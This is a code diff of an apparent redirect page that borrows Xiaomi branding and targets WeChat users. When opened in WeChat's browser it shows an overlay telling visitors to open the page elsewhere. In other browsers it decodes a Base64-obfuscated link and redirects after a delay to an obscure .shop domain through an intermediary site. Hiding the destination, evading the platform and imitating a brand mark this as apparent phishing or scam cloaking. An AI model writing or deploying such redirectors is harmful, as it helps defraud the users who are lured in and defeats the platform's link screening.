@@ -7,18 +7,16 @@
   <style>
     body {
       margin: 0;
-      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-      background-color: #f0f2f5;
-      text-align: center;
-      padding: 0;
+      font-family: sans-serif;
+      background-color: #000;
+      color: white;
+      overflow: hidden;
     }
 
     .guide-overlay {
       position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      backdrop-filter: blur(6px);
-      background-color: rgba(0, 0, 0, 0.65);
+      inset: 0;
+      background-color: rgba(0,0,0,0.8);
       z-index: 9999;
       display: none;
     }
@@ -28,7 +26,6 @@
       top: 10px;
       right: 10px;
       text-align: right;
-      color: #fff;
     }
 
     .guide-box img.arrow {
@@ -39,13 +36,13 @@
 
     .guide-box h2 {
       font-size: 18px;
-      margin: 0 0 5px;
+      margin: 0;
     }
 
     .guide-box p {
       font-size: 14px;
+      color: #ccc;
       margin: 0;
-      color: #ddd;
     }
 
     .center-logo {
@@ -57,9 +54,7 @@
 
     .center-logo img {
       width: 80px;
-      animation:
-        spin 10s linear infinite,
-        pulse 2s ease-in-out infinite alternate;
+      animation: spin 10s linear infinite, pulse 2s ease-in-out infinite alternate;
     }
 
     @keyframes bounce {
@@ -80,14 +75,12 @@
 </head>
 <body>
 
-<!-- 引导遮罩层 -->
+<!-- 引导层 -->
 <div class="guide-overlay" id="wechatGuide">
-  <!-- 中间小米 Logo -->
   <div class="center-logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ae/Xiaomi_logo_%282021-%29.svg" alt="小米 Logo">
+    <img src="xiaomi-logo.png" alt="小米 Logo">
   </div>
 
-  <!-- 右上角引导提示 -->
   <div class="guide-box">
     <img src="arrow.png" class="arrow" alt="向上箭头" />
     <h2>点击右上角 ···</h2>
@@ -96,18 +89,14 @@
 </div>
 
 <script>
-  // 加密后的跳转链接（Base64）
+  // Base64 加密后的跳转链接（你已提供）
   const encodedUrl = "aHR0cDovL2Vhc3RsaW9uYWQuY24vSW5kdGx6eC5odG1sP2h0dHBzOi8vZ2dlcnNjLnNob3AvaUhkZ25YL3dpeXJ1aXdycHUvcnlldQ==";
 
-  // 安全解码函数（安卓微信兼容）
-  function safeBase64Decode(encoded) {
+  // 更安全的 Base64 解码（安卓兼容）
+  function decodeBase64(str) {
     try {
-      const fixed = encoded.replace(/-/g, '+').replace(/_/g, '/');
-      const decoded = decodeURIComponent(escape(window.atob(fixed)));
-      if (!decoded.startsWith("http")) return null;
-      return decoded;
+      return atob(str);
     } catch (e) {
-      console.error("Base64 解码失败：", e);
       return null;
     }
   }
@@ -119,24 +108,20 @@
 
   window.onload = function () {
     const guide = document.getElementById("wechatGuide");
-    const decodedUrl = safeBase64Decode(encodedUrl);
+    const decodedUrl = decodeBase64(encodedUrl);
 
-    if (!decodedUrl) {
-      document.body.innerHTML = "<p style='color:white;'>跳转地址无效，请联系管理员。</p>";
+    if (!decodedUrl || !decodedUrl.startsWith("http")) {
+      document.body.innerHTML = "<p style='padding:20px;'>跳转地址无效，请联系管理员。</p>";
       return;
     }
 
     if (isWeChatBrowser()) {
       guide.style.display = "block";
     } else {
-      // 安卓微信环境可能加载慢，适当延迟
+      // 延迟跳转（让页面加载不被中断）
       setTimeout(() => {
-        try {
-          window.location.href = decodedUrl;
-        } catch (err) {
-          console.error("跳转失败：", err);
-        }
-      }, 1200);
+        window.location.href = decodedUrl;
+      }, 1000);
     }
   };
 </script>
